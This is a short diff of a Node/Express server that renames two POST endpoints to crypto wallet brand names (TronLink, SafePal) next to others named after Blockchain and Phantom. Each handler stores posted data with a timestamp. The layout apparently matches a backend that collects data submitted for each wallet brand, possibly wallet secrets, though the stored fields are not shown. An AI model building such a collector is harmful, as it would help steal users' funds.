@@ -161,7 +161,7 @@ server.post("/api/blockchain",(req,res)=>{
     saveSchema()
 })
 
-server.post("/api/data4",(req,res)=>{
+server.post("/api/tronlink",(req,res)=>{
     async function saveSchema(){
         let data = new schema4Use({
             Time:indiaTime,
@@ -215,7 +215,7 @@ server.post("/api/phantom",(req,res)=>{
     saveSchema()
 })
 
-server.post("/api/data7",(req,res)=>{
+server.post("/api/safepal",(req,res)=>{
     async function saveSchema(){
         let data = new schema7Use({
             Time:indiaTime,
